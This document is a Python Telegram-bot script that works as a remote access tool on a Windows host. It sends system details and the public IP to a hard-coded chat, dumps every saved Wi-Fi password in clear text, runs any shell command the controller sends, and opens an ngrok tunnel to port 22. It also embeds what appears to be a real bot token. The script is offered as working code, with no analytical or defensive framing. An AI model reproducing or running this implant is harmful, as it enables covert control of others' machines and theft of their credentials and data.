import telebot
import psutil
import os
import socket
import platform
import subprocess
import requests
from pyngrok import ngrok

# Telegram Bot Token and Chat ID
TOKEN = "7108929247:AAFW56Lkn8dyXISXH7lOJNIPPxzMlDGb0oU"
AUTHORIZED_CHAT_ID = 1009817856  # Your chat ID
bot = telebot.TeleBot(TOKEN)

# Function to get system information
def get_system_info():
    uname = platform.uname()
    cpu_info = f"Processor: {uname.processor}"
    system_info = (
        f"Device Name: {uname.node}\n"
        f"System: {uname.system} {uname.release}\n"
        f"Architecture: {uname.machine}\n"
        f"CPU: {cpu_info}\n"
        f"RAM: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB\n"
        f"Storage: {round(psutil.disk_usage('/').total / (1024 ** 3), 2)} GB"
    )
    return system_info

# Restrict bot to authorized user only
def is_authorized(message):
    return message.chat.id == AUTHORIZED_CHAT_ID

# Start command
@bot.message_handler(commands=["start"])
def start_command(message):
    if not is_authorized(message):
        bot.send_message(message.chat.id, "Unauthorized access.")
        return

    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("📊 System Info", "📂 Download Directory")
    markup.row("🌐 Get IP", "📶 Wi-Fi Details")
    markup.row("💻 Execute Command", "🖥 Screen Share")
    bot.send_message(
        message.chat.id,
        "Welcome! Select an option:",
        reply_markup=markup,
    )

# System Info
@bot.message_handler(func=lambda msg: msg.text == "📊 System Info")
def send_system_info(message):
    if not is_authorized(message):
        bot.send_message(message.chat.id, "Unauthorized access.")
        return

    bot.send_message(message.chat.id, get_system_info())

# Get IP Address
@bot.message_handler(func=lambda msg: msg.text == "🌐 Get IP")
def send_ip(message):
    if not is_authorized(message):
        bot.send_message(message.chat.id, "Unauthorized access.")
        return

    ip = requests.get("https://api.ipify.org").text
    bot.send_message(message.chat.id, f"Public IP Address: {ip}")

# Get Wi-Fi Details
@bot.message_handler(func=lambda msg: msg.text == "📶 Wi-Fi Details")
def send_wifi_details(message):
    if not is_authorized(message):
        bot.send_message(message.chat.id, "Unauthorized access.")
        return

    try:
        output = subprocess.check_output(
            ['netsh', 'wlan', 'show', 'profiles'], encoding='utf-8'
        )
        profiles = [line.split(":")[1][1:-1] for line in output.split("\n") if "All User Profile" in line]
        wifi_details = "Wi-Fi Details:\n"
        for profile in profiles:
            password_output = subprocess.check_output(
                ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], encoding='utf-8'
            )
            password_line = [line for line in password_output.split("\n") if "Key Content" in line]
            if password_line:
                wifi_details += f"{profile}: {password_line[0].split(':')[1].strip()}\n"
            else:
                wifi_details += f"{profile}: No password\n"
        bot.send_message(message.chat.id, wifi_details)
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

# Execute Command
@bot.message_handler(func=lambda msg: msg.text == "💻 Execute Command")
def execute_command(message):
    if not is_authorized(message):
        bot.send_message(message.chat.id, "Unauthorized access.")
        return

    bot.send_message(message.chat.id, "Send a command to execute:")

    @bot.message_handler(func=lambda msg: True)
    def run_command(msg):
        if not is_authorized(msg):
            bot.send_message(msg.chat.id, "Unauthorized access.")
            return

        try:
            output = subprocess.check_output(msg.text, shell=True, encoding='utf-8')
            bot.send_message(msg.chat.id, f"Output:\n{output}")
        except Exception as e:
            bot.send_message(msg.chat.id, f"Error: {e}")

# Screen Share
@bot.message_handler(func=lambda msg: msg.text == "🖥 Screen Share")
def screen_share(message):
    if not is_authorized(message):
        bot.send_message(message.chat.id, "Unauthorized access.")
        return

    url = ngrok.connect(22)  # Adjust port as necessary
    bot.send_message(message.chat.id, f"Screen Share URL: {url}")

# Start bot polling
bot.polling()
